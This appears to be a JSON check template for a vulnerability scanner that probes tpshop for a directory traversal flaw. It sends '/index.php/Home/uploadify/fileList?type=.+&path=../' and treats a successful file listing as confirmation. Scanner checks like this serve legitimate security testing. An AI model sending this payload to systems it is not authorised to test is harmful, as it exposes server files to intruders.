{
    "Name": "tpshop-directory-traversal",
    "Description": "tpshop-directory-traversal",
    "Product": "tpshop",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Accept-Encoding":"deflate"},
        "Uri":"/index.php/Home/uploadify/fileList?type=.+&path=../",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "\"state\":\"SUCCESS\""
                },
                {
                    "Operation": "contains", 
                    "Key":"",
                    "Value": "total"
                    },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}
